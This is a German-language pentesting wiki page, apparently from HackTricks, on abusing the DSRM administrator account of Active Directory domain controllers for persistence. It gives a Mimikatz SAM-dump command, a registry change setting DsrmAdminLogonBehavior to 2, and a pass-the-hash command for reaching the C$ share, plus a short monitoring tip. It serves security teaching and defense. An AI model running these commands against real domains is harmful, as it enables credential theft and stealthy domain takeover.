# DSRM-Anmeldedaten

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Jeder Domain Controller verfügt über ein Administratorkonto für den Directory Services Restore Mode (DSRM). Sein Passwort wird während der Heraufstufung zum Domain Controller festgelegt und ist von den Active-Directory-Domainkonten getrennt.<sup>[[1]](#references)</sup>

Ein Angreifer mit administrativer Kontrolle über einen Domain Controller kann die lokale SAM-Datenbank dumpen und den NTLM-Hash des DSRM-Administrators wiederherstellen. Der folgende Mimikatz-Befehl führt diesen Vorgang aus:<sup>[[2]](#references)</sup>
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Standardmäßig ist das DSRM-Konto für den Wiederherstellungsmodus vorgesehen. Durch das Setzen von `DsrmAdminLogonBehavior` auf `2` kann sich dieses lokale Konto authentifizieren, während der Domänencontroller normal ausgeführt wird. Überprüfe den Wert, bevor du ihn änderst:<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue

if ($null -eq $current) {
New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
} else {
Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
}
```
Der wiederhergestellte Hash kann anschließend in einer Pass-the-Hash-Sitzung verwendet werden, um auf Ressourcen wie die administrative `C$`-Freigabe zuzugreifen. Verwende für dieses lokale Konto den Computernamen des Domain Controllers als Wert für `/domain`:<sup>[[3]](#references)</sup>
```powershell
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
# In the new PowerShell process, access C$ over NTLM.
ls \\dc-host-name\C$
```
## Mitigation

- Überwachen Sie Änderungen an `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`. Das Sicherheitsereignis 4657 protokolliert eine Änderung eines Registrierungswerts, wenn die SACL des Schlüssels für die Überwachung von **Set Value**-Vorgängen konfiguriert ist.<sup>[[4]](#references)</sup>

## References

- [1] [Microsoft: Zurücksetzen des Administratorkennworts für den Directory Services Restore Mode](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [2] [ADSecurity: Heimliche Persistenz in Active Directory Nr. 11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
- [3] [ADSecurity: Heimliche Persistenz in Active Directory Nr. 13 — DSRM Persistence v2](https://adsecurity.org/?p=1785)
- [4] [Microsoft: Ereignis 4657 — Ein Registrierungswert wurde geändert](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
{{#include ../../banners/hacktricks-training.md}}
